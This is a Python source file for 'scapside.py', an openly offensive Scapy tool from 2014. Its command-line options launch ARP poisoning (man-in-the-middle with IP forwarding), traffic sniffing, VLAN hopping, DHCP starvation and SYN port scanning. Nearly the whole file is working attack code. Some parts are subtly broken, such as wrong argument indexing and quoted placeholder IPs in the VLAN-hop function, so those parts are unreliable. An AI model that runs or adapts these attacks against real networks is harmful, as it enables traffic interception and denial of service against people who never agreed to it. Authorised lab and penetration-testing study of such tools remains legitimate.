#!/usr/bin/env python
#
################################################################################
# License BEERWARE
################################################################################
# Copyright (c) 2014 Bastien CERIANI & Thomas ROCCIA & Thibaud RASO.  All rights reserved.
#
# * ----------------------------------------------------------------------------
# * "THE BEER-WARE LICENSE" (Revision 42):
# * <thomas.roccia@gmail.com> & <bastien.ceriani@gmail.com>  & <rasothibaud@gmail.com>
# *  wrote this file.
# * As long as you retain this notice you can do whatever you want with this
# * stuff. If we meet some day, and you think this stuff is worth it,
# * you can buy us a beer in return.  @Bastichou & @R1tch1e
# * ----------------------------------------------------------------------------
#                                                                          
#    @@@@@+   @@@@@@  @@@@@@  '@@@@@`  @@   @@:  @@`  '@@:    @@@@@'   @@@@@@ 
#    @@;'@@:  @@@@@@  @@@@@@  '@@#@@@  #@'  @@@  @@   @@@@    @@#@@@.  @@@@@@ 
#    @@  @@'  @@      @@`     '@@  @@  `@@ .@#@  @@   @@@@    @@  @@;  @@`    
#    @@@@@@   @@@@@#  @@@@@@  '@@ `@@   @@ #@.@ :@@  @@,:@#   @@  @@   @@@@@@ 
#    @@@@@@`  @@@@@#  @@@@@@  '@@@@#    @@ @@ @,@@,  @@  @@   @@@@@    @@@@@@ 
#    @@  .@@  @@      @@`     '@@`@@@   @@;@, @@@@  ,@@##@@`  @@ +@@   @@`    
#    @@  .@@  @@      @@`     '@@  @@   .@@@  @@@@  @@@@@@@@  @@  @@+  @@`    
#    @@@@@@+  @@@@@@  @@@@@@  '@@  #@@   @@@  ,@@@  @@    @@  @@   @@  @@@@@@ 
#    @@@@+`   @@@@@@  @@@@@@  '@@   @@   @@@   @@: '@@    @@: @@   @@' @@@@@@ 
#
################################################################################
#
# Script scapside.py by Thomas ROCCIA R1tch1e / Bastien CERIANI Bastichou
# version : V0.6
#

import uuid
import signal
import time
import ConfigParser
import sys
import multiprocessing
import logging
from optparse import OptionParser

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
	#import scapy
	from scapy.all import *
except ImportError:
	print("Unable to locate the 'scapy' module. Maybe you forget to install it ?!")
	sys.exit(1)

################################################################################
# Configuration options
script_name = "scapside.py"
script_author = "R1tch1e & Bastichou" 
script_version = "0.6"
script_description = "A %s is a pretty little tool to perform basic network attacks using Scapy" % script_name
usage = "%s | by %s \n" \
		"\n %s [options] [arguments] \n" \
		"Ex : python %s --arpoison <victimIP> <routerIP> \n" \
		"Ex : python %s --sniffing [\"filter\"] \n" \
		"Ex : python %s --vlanhop <typeTAG> <vlanID> <vlanID> <IPsrc> <IPdst> \n" \
		"Ex : python %s --dhcpstar \n" \
		"Ex : python %s --scanner <targetIP> \n" % (script_name, script_author, script_name, script_name, script_name, script_name, script_name, script_name)

		
################################################################################
# function Arp Poisoning
def run_arpoison():
	print "Starting the arpoison function.."
	# Scapy configuration
	try:
		conf.checkIPaddr = False
	except Exception, e:
		print('Bad scapy configuraton : %s' % e)
		
	# Get Mac Address Attacker
	if verbose:
		print "Getting attacker's MAC address"
	try:
		mac = get_if_hwaddr(int)
		if verbose:
			print ("\tMAC: %s" % mac)
	except Exception, e:
		print('Unable to get local MAC address : %s' % e) 
		sys.exit(1)

	# Activation IP_forwarding
	try:
		with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
			ipf.write('1\n')
		if verbose:
			print "Starting IP Forward.."
	except Exception, e:
		print('Unable to edit ip_forward file : %s' % e)
		sys.exit(1)
	# Configure ARP packet

	arp=ARP(op=1,psrc=dstIP,pdst=srcIP,hwdst=mac)
	arp2=ARP(op=1,psrc=srcIP,pdst=dstIP,hwdst=mac)
	
	# Send ARP Packet
	if verbose:
		print "Sending ARP packets.."
	#while not e.isSet():
	while 1:
		if verbose:
			send(arp)
			send(arp2)
		else:
			send(arp,verbose=0)
			send(arp2,verbose=0)
		time.sleep(2)
			
################################################################################
# function Thread Handler
def signal_handler(signal, frame):
	print("\nScript interrupted by user.\nBye !")
	return true
			
################################################################################
# SNIFFING
def run_sniffing():
	print "Starting the sniffing function.."
	try:
		s = sniff(filter=sfilter, count=0, prn=None, lfilter=None, timeout=None, iface=int)
	except Exception, e:
		print("Error while starting sniffing function : %s" % e)
		sys.exit(1)
	try:
		if verbose:
			print "\nPCAP file : sniffing.pcap"	
		wrpcap('sniffing.pcap', s)
	except Exception, e:
		print("Error while writing the PCAP file : %s" % e)
		sys.exit(1)

################################################################################
# VLAN Hopper
def run_vlanhop():
	# Get Mac Address Attacker
        #mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
	#sendp(Ether()/Dot1Q(vlan=2)/Dot1Q(vlan=7)/IP(dst=target)/ICMP())
	vhop = Ether()/Dot1Q(vlan=vlanSRC)/Dot1Q(vlan=vlanDST)/IP(src="srcIP",dst="dstIP",options=IPOption_RR())
	
	sendp(vhop)

################################################################################
# DHCP Starvation
def run_dhcpstar():
	conf.checkIPaddr = False
	dhcp_discover = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
	
	sendp(dhcp_discover,loop=1)

################################################################################
# Port scanner
def run_scanner():
	dst_ip = dstIP
	src_port = RandShort()

	# OS detection first
	conf.verb = 0
	dos={64 : 'Linux', 128 : 'Windows'}
	for ip,ttl in [(p[1].src,p[1].ttl) for p in sr(IP(dst=[p[1][ARP].psrc for p in arping(dst_ip)[0]])/ICMP(),timeout=.5)[0][IP]]:
		print "Host " + ip +" is a " + dos.get(ttl,'Inconnu')

	# Start looping for port discovery
	for dst_port in range(1, 1023):
		tcp_connect_scan_resp = sr1(IP(dst=dst_ip)/TCP(sport=src_port,dport=dst_port,flags="S"),timeout=.01, verbose=0)
		if(str(type(tcp_connect_scan_resp))!="<type 'NoneType'>"):
			if(tcp_connect_scan_resp.haslayer(TCP)):
				if(tcp_connect_scan_resp.getlayer(TCP).flags == 0x12):
					send_rst = sr(IP(dst=dst_ip)/TCP(sport=src_port,dport=dst_port,flags="AR"),timeout=.01, verbose=0)
					print('%s:open'%dst_port)
	
################################################################################
# cli_parser
def cli_parser():
		# Initiate the optionParser with some options
		parser = OptionParser(usage=usage, description=script_description, version=script_version)
		
		# Options configurations
		# action="store_true" create a boolean
		parser.add_option("-a", "--arpoison",dest="arpoison",action="store_true", 
							default="False",help="Start an ARP Poisonning attack")
		parser.add_option("-v", "--vlanhop",dest="vlanhop",action="store_true",
							default="False",help="Start VLAN Hopping attack")
		parser.add_option("-d", "--dhcp",dest="dhcpstar",action="store_true",
							default="False",help="Start DHCP Starvation attack")
		parser.add_option("-n", "--scanner",dest="scanner",action="store_true",
							default="False",help="Start Port scanning")
		parser.add_option("-s", "--sniffing",dest="sfilter", type="string",
							default=None,help="Start sniffing traffic while script is running: add a filter between double quote.")
		parser.add_option("-i", "--interface",dest="int", default="eth0",
							help="Select a specific interface to perform attacks")
		parser.add_option("-q", "--quiet",dest="verbose",action="store_false",
							default="True",help="Don't show the verbose action")
		return parser

################################################################################
# load_cli_options
def load_cli_options(parser):
	global arpoison
	global vlanhop
	global sfilter
	global verbose
	global dhcpstar
	global scanner
	global int
	global srcIP
	global dstIP

	# Fetch all options and arguments provided by user
	(options, args) = parser.parse_args()
	
	arpoison = options.arpoison
	vlanhop = options.vlanhop
	dhcpstar = options.dhcpstar
	scanner = options.scanner
	verbose = options.verbose
	sfilter = options.sfilter
	int = options.int
	
	# These options can't be used together
	if (arpoison == True and vlanhop == True) or (arpoison == True and dhcpstar == True) \
		or (vlanhop == True and dhcpstar == True) \
		or (sfilter == True and dhcpstar == True) or (sfilter == True and vlanhop == True):
		parser.error("Options -a, -v and -d are mutually exclusive !")
	
	# Some additional configurations needed by Arpoison
	if arpoison == True:
		if len(args) != 2:
			parser.error("Incorrect number of arguments, two needed")
		srcIP = args[0]
		dstIP = args[1]
	
	# Some additional configurations needed by Vlanhop	
	if vlanhop == True:
		global typetag
		global vlanSRC
		global vlanDST
		
		if len(args) != 4:
			parser.error("Incorrect number of arguments, five needed")
		vlantag = args[0]
		vlanSRC = args[1]
		vlanDST = args[3]
		srcIP = args[4]
		dstIP = args[5]		

	# Port scanning relative features
	if scanner == True:
		if len(args) != 1:
			parser.error("Incorrect number of arguments, one needed")
		dstIP = args[0]
	
################################################################################
# Main function
def main():
	parser = cli_parser()
	load_cli_options(parser)
	
	runningThread = []
	if arpoison == True:
		try:
			#tarp = threading.Thread(name="tarp",target=run_arpoison,args=(stopEvent,))
			tarp = multiprocessing.Process(name="tarp",target=run_arpoison)
			runningThread.append(tarp)
			tarp.start()
		except Exception, e:
			print("Error while starting ARP poisoning function: %s " %e)
			sys.exit(1)
	
	if vlanhop == True:
		print "Starting the vlanhop function.."
		run_vlanhop()
		
	if dhcpstar == True:
		print "Starting the dhcpstar function.."
		run_dhcpstar()
	
	if scanner == True:
		print "Starting the scanner function.."
		run_scanner()

	if sfilter != None:
		try:
			tsniff = multiprocessing.Process(name="tsniff",target=run_sniffing)
			runningThread.append(tsniff)
			tsniff.start()
		except Exception, e:
			print("Error while starting sniffing function: %s " %e)
			sys.exit(1)
	print("Script is running. Press CTRL+C to stop it!\n")
	while 1:
		try:
			time.sleep(5)
		except KeyboardInterrupt:
			print '\nScript interrupted by user'
			if 'tarp' in locals():
				tarp.terminate()
			sys.exit(1)
	
	print "\nBANG BANG **"
	
if __name__ == "__main__":
	main()
